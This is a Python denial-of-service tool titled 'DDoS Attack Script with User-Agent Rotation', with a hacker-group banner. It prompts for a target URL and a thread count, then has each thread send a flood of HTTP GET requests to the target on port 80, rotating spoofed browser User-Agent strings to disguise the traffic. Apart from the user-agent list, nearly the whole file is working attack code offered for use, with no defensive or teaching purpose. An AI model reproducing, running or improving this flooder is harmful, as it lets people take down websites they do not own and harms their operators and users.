# DDoS Attack Script with User-Agent Rotation

import sys
import re
import socket
import threading
import random
from urllib.parse import urlparse

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0",
    "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; AS; rv:11.0) like Gecko",
    "Mozilla/5.0 (Linux; Ubuntu 20.04; x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
    "Mozilla/5.0 (Linux; Android 9; SM-G960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 11; Pixel 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9",
    "Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4",
    "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240",
    "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
    "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
    "Mozilla/5.0 (Linux; Android 12; V2120 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:84.0) Gecko/20100101 Firefox/84.0",
    "Mozilla/5.0 (Linux; Android 9; SM-G960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:84.0) Gecko/20100101 Firefox/84.0",
    "Mozilla/5.0 (Linux; Android 9; SM-G960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:84.0) Gecko/20100101 Firefox/84.0",
    "Mozilla/5.0 (Linux; Android 9; SM-G960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0",
    "Mozilla/5.0 (Linux; Ubuntu; X11; rv:85.0) Gecko/20100101 Firefox/85.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; AS; rv:11.0) like Gecko",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 9; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-G973U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0 Mobile/15E148 Safari/604.1",
]

flag = 0
safe = 0
request_counter = 0

print("""
\033[36m
╔═══════════════━━━─── • ───━━━═══════════════╗
║      ╔═╦╦╦╗╔══╦═╦═╗──╔══╦══╦══╦══╦═╦╦╗      ║
║      ║╬║║║║║══╣╦╣╬╠══╣╔╗╠╗╔╩╗╔╣╔╗║╔╣╔╝      ║
║      ║╔╣║║╚╬══║╩╣╗╬══╣╠╣║║║─║║║╠╣║╚╣╚╗      ║
║      ╚╝╚═╩═╩══╩═╩╩╝──╚╝╚╝╚╝─╚╝╚╝╚╩═╩╩╝      ║
║           MADE BY XYLER HACKTIVST           ║
╠═══════════════━━━─── • ───━━━═══════════════╣
║    Please do not attack gov/edu website     ║
╚═══════════════⋅•⋅⊰∙∘☽༓☾∘∙⊱⋅•⋅═══════════════╝
\n\033[0m
""")
url = input("Enter Url: ")
thread_count = int(input("Enter Number of Threads: "))

parsed_url = urlparse(url)
host = parsed_url.netloc

if not host:
    print("[ERROR] Invalid URL. Exiting.")
    sys.exit(1)

def set_flag(value):
    global flag
    flag = value

def set_safe():
    global safe
    safe = 1

def httpcall(target_url):
    global request_counter
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        sock.connect((host, 80))

        request = f"GET / HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {random.choice(user_agents)}\r\nConnection: keep-alive\r\n\r\n"  
        sock.send(request.encode())  

        request_counter += 1  

        response = sock.recv(1024)  

        return 500 if response == b"" else 200  

    except socket.error:  
        return 0  

    finally:  
        sock.close()

class HTTPThread(threading.Thread):
    def run(self):
        global flag
        try:
            while flag < 2:
                for _ in range(900000):
                    code = httpcall(url)
                    if code == 500 and safe == 1:
                        set_flag(2)
        except Exception as ex:
            pass

class MonitorThread(threading.Thread):
    def run(self):
        global request_counter
        previous = request_counter
        while flag == 0:
            if previous + 150 < request_counter and previous != request_counter:
                previous = request_counter
            if flag == 2:
                print("\n[!] Stopping Attack.")

print("\n[+] Starting Attack...")

threads = []
for _ in range(thread_count):
    t = HTTPThread()
    t.start()
    threads.append(t)

monitor = MonitorThread()
monitor.start()

for t in threads:
    t.join()
